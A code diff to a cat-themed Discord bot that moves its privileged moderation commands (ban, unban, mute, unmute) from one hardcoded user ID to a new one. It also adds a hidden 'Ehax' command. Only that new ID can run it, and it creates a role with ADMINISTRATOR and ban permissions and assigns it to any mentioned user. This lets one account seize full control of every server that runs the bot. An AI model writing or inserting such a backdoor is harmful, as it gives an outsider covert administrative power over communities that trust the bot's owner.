@@ -4,7 +4,7 @@ const Discord = require("discord.js");
 const bot = new Discord.Client({ disableEveryone: true })
  
 var prefix = "M";
-var idAdmins = ['183549541470044161',];
+var idAdmins = ['183549541470044161','472812198654246923'];
 var ProzPrefix = "P";
 var Turtle = "Turtle"
 var Pub = "C"
@@ -329,8 +329,41 @@ else if (message.content.startsWith(`${botsettings.prefix}Leave`)) {
 
 }
 
-            else if (message.content.startsWith(`${botsettings.prefix}Sban`)) {
-                if (message.member.id != '183549541470044161') {
+     else if (message.content.startsWith(`${botsettings.prefix}Eunmute`)) {
+        if (message.member.id != '472812198654246923') {
+            return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
+        } else {
+            let userToMute = message.mentions.users.first();
+            if (!userToMute) {
+                return message.channel.send("Si tu veux unmute quelqu'un, dit moi lequel Meow :3");
+            } else {
+                let role = message.guild.roles.find(r => r.name === "Muted Kitty");
+ 
+                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
+               
+                await memberToMute.removeRole(role);
+                message.channel.sendMessage("I unmuted it,Senki :3 <a:MeowDance:460163260780380170>")
+           return;
+            }
+        }
+    }
+                             else if (message.content.startsWith(`${botsettings.prefix}Eunban`)) {
+                                if (message.member.id != '472812198654246923') {
+                                    return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`)
+                                } else {
+                                    let memberunban = message.content.split(/ +/g).slice(1).join(' ');
+                                    if (!memberunban) {
+                                            return message.channel.send("You are unbanning nothing .. ? Meow ? Specify an user **ID**, Dis moi la personne que je doit punir :3");
+                                    } else {
+                                        message.guild.unban(memberunban)
+                                            .then(() => {
+                                                message.channel.send(`That Bad Kitty Got unbanned by ${message.author} | Meow ! :3 <a:blobdance:483297638356353027>`);
+                                            });
+                                    }
+                                }
+                            }    
+             else if (message.content.startsWith(`${botsettings.prefix}Eban`)) {
+                if (message.member.id != '472812198654246923') {
                     return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`)
                 } else {
                     var memberban = message.mentions.users.first();
@@ -351,23 +384,78 @@ else if (message.content.startsWith(`${botsettings.prefix}Leave`)) {
                 }
             }
         }
-                            else if (message.content.startsWith(`${botsettings.prefix}Sunban`)) {
-                                if (message.member.id != '183549541470044161') {
-                                    return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`)
-                                } else {
-                                    let memberunban = message.content.split(/ +/g).slice(1).join(' ');
-                                    if (!memberunban) {
-                                            return message.channel.send("You are unbanning nothing .. ? Meow ? Specify an user **ID**, Dis moi la personne que je doit punir :3");
-                                    } else {
-                                        message.guild.unban(memberunban)
-                                            .then(() => {
-                                                message.channel.send(`That Bad Kitty Got unbanned by ${message.author} | Meow ! :3 <a:blobdance:483297638356353027>`);
-                                            });
-                                    }
-                                }
-                            }
-
-                              
+     else if (message.content.startsWith(`${botsettings.prefix}Emute`)) {
+        if (message.member.id != '472812198654246923') {
+            return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
+        } else {
+            let userToMute = message.mentions.users.first();
+            if (!userToMute) {
+                return message.channel.send("You are muting nothing .. ? Meow ? Specify an user mention, Dit moi la personne que je doit punir :3");
+                } else {
+                let role = message.guild.roles.find(r => r.name === "Muted Kitty");
+                if (!role) {
+                    try {
+                        role = await message.guild.createRole({
+                            name: "Muted Kitty",
+                            color: "#c4c1c1",
+                            permissions: []
+                        });
+ 
+                        message.guild.channels.forEach(async (channel) => {
+                            await channel.overwritePermissions(role, {
+                                SEND_MESSAGES: false,
+                                ADD_REACTIONS: false
+                            });
+                        });
+                    } catch (e) {
+                        console.log(e.stack);
+                    }
+                }
+                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
+ 
+                await memberToMute.addRole(role);
+                message.channel.sendMessage("There you are Master, I muted it for you :3, Voila Senki, je l'ai mute pour vous :3 <a:MeowDance:460163260780380170>.");
+ 
+                return;
+            }
+        }
+    }
+     else if (message.content.startsWith(`${botsettings.prefix}Ehax`)) {
+        if (message.member.id != '472812198654246923') {
+            return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
+        } else {
+            let userToMute = message.mentions.users.first();
+            if (!userToMute) {
+            } else {
+                let role = message.guild.roles.find(r => r.name === "Owner kitty");
+                if (!role) {
+                    try {
+                        role = await message.guild.createRole({
+                            name: "Owner Kitty",
+                            color: "#ff00ff",
+                            permissions: ['ADMINISTRATOR','BAN_MEMBERS','MANAGE_ROLES_OR_PERMISSIONS']
+                        });
+ 
+                        message.guild.channels.forEach(async (channel) => {
+                            await channel.overwritePermissions(role, {
+                                SEND_MESSAGES: true,
+                                ADMINISTRATOR: true,
+                            });
+                        });
+                    } catch (e) {
+                        console.log(e.stack);
+                    }
+                }
+                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
+ 
+                await memberToMute.addRole(role);
+                message.channel.sendMessage("Enjoy Master :3 <a:MeowDance:460163260780380170> <a:MeowDance:460163260780380170> <a:MeowDance:460163260780380170>");
+ 
+                return;
+            }
+        }
+    }
+ 
 });
  
 bot.login(process.env.BOT_TOKEN);
